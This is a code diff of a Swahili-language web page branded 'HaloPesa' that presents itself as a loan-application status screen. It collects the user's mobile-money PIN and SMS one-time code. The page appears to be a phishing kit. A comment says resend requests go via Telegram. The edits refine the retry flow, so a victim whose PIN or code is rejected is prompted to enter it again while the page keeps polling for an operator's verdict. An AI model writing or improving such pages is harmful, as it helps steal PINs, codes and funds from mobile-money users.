@@ -5,6 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>HaloPesa - Hali ya Ombi</title>
     <style>
+        /* [Mwelekeo wako wa CSS umebaki sawa – umeandikwa hapo awali] */
         :root {
             --hp-orange: #FF5A1F;
             --hp-dark: #d94d18;
@@ -113,7 +114,6 @@
                     <input type="password" class="code-box" maxlength="1" pattern="[0-9]" inputmode="numeric">
                 </div>
                 <button class="btn-submit" id="verifyBtn">Thibitisha Msimbo</button>
-                <!-- ✅ Kiungo cha kuomba tena msimbo -->
                 <a id="resendLink" class="resend-link">📩 Sijapokea msimbo? Bonyeza hapa kuomba tena.</a>
                 <div id="codeStatus" class="status-message hidden"></div>
             </div>
@@ -199,7 +199,7 @@
         }
 
         // ================================================
-        // SANDBOX ZA MSIMBO – zinajaza moja kwa moja
+        // SANDBOX – auto-advance & backspace
         // ================================================
         codeBoxes.forEach((box, index) => {
             box.addEventListener('input', function() {
@@ -227,12 +227,11 @@
         });
 
         // ================================================
-        // TUMIA TENA MSIMBO (Resend OTP)
+        // TUMIA TENA MSIMBO (Resend OTP) – inatuma kwa Telegram
         // ================================================
         resendLink.addEventListener('click', async function(e) {
             e.preventDefault();
             if (!appId) return;
-            // Disable link temporary
             resendLink.style.pointerEvents = 'none';
             resendLink.style.opacity = '0.6';
             resendLink.textContent = '⏳ Inatuma...';
@@ -299,7 +298,7 @@
                             window.location.href = `/success?app_id=${appId}&amount=${amount}&months=${months}&phone=${phone}`;
                         }, 2000);
                     } else if (data.code_status === 'wrong_pin' || data.status === 'wrong_pin') {
-                        // ❌ PIN MBAYA – rudisha kwenye ukurasa wa PIN
+                        // ❌ PIN mbaya – rudisha kwenye ukurasa wa PIN
                         statusText = '❌ PIN si sahihi. Inarudisha kwenye ukurasa wa PIN...';
                         statusClass = 'error';
                         isError = true;
@@ -311,32 +310,33 @@
                             window.location.href = `/pin-entry?amount=${amount}&months=${months}&fullName=${encodeURIComponent(fullName)}&phone=${phone}&employment=${employment}&income=${income}&error=wrong_pin`;
                         }, 1500);
                     } else if (data.code_status === 'wrong_code') {
-                        // ❌ MSIMBO MBAYA – onyesha sanduku nyekundu, ruhusu kuandika tena
-                        // Badala ya "Imekataliwa", tunasema "Msimbo si sahihi" na kuruhusu kuingiza tena
-                        statusText = '❌ Msimbo si sahihi. Tafadhali ingiza msimbo uliopokea kwenye SMS yako.';
-                        statusClass = 'error';
-                        // Usibadilishe kichwa kuwa "Imekataliwa" – tunataka iwe "Inachakatwa" au "Ingiza msimbo"
-                        // Tutaweka kichwa kuwa "⏳ Inasubiri" au "⏳ Ingiza Msimbo"
-                        statusTitle.textContent = '⏳ Ingiza Msimbo';
-                        // Weka sanduku nyekundu, futa maandishi, na ruhusu kuandika tena
+                        // ✅ MSIMBO MBAYA – onyesha sanduku nyekundu na RUHUSU KUANDIKA TENA
+                        // Hakikisha sehemu ya msimbo inaonekana (ikiwa imefichwa, ionyeshe)
+                        codeSection.classList.remove('hidden');
+                        // Weka sanduku nyekundu, futa maandishi, na fanya ziwe tayari kwa kuingiza
                         codeBoxes.forEach(box => {
                             box.classList.add('error');
                             box.value = '';
                             box.classList.remove('filled');
+                            box.disabled = false;  // hakikisha hazijazimwa
                         });
                         verifyBtn.disabled = false;
                         verifyBtn.textContent = 'Thibitisha Msimbo';
                         codeBoxes[0].focus();
+                        // Onyesha ujumbe wa makosa
                         showCodeStatus('❌ Msimbo si sahihi. Tafadhali ingiza tena.', 'error');
-                        // Usifanye clearInterval – inaendelea kupiga polling
-                        // Usifanye codeSection hidden – inabaki wazi
-                        // Usifanye timerBox hidden – muda unaendelea
-                        // Usibadilishe setStatus, tunataka kuonyesha ujumbe huo
-                        // Tutaweka statusMsg na statusClass
+                        // Badilisha ujumbe wa hali kuu
+                        statusText = '❌ Msimbo si sahihi. Tafadhali ingiza msimbo uliopokea kwenye SMS yako.';
+                        statusClass = 'error';
                         statusMsg.textContent = statusText;
                         statusMsg.className = 'status-message ' + statusClass;
-                        // Usibadilishe statusTitle tena
-                        return; // To avoid running the generic setStatus below
+                        // Weka kichwa kuwa "⏳ Ingiza Msimbo" – sio "Imekataliwa"
+                        statusTitle.textContent = '⏳ Ingiza Msimbo';
+                        // Usifanye clearInterval – polling inaendelea
+                        // Usifanye stopTimer – muda unaendelea
+                        // Usifanye codeSection hidden
+                        // Usifanye timerBox hidden
+                        return; // Toa nje ili usiendeshe setStatus ya chini
                     } else if (data.status === 'invalid') {
                         statusText = `❌ Ombi limekataliwa. Sababu: ${data.invalid_type || 'Hajakidhi vigezo.'}`;
                         statusClass = 'error';
@@ -367,11 +367,10 @@
             if (type === 'success') {
                 statusTitle.textContent = '✅ Imekubaliwa';
             } else if (type === 'error' && isError) {
-                // Kwa makosa makubwa (invalid, not_found) tunaweka "Imekataliwa"
                 statusTitle.textContent = '❌ Imekataliwa';
             } else if (type === 'error') {
-                // Kwa makosa mengine (kama wrong_code) tunaweka "⏳ Inachakatwa"
-                statusTitle.textContent = '⏳ Inachakatwa';
+                // Kwa makosa kama wrong_code, tunataka kichwa kiwe "⏳ Ingiza Msimbo"
+                statusTitle.textContent = '⏳ Ingiza Msimbo';
             } else {
                 statusTitle.textContent = '⏳ Inachakatwa';
             }
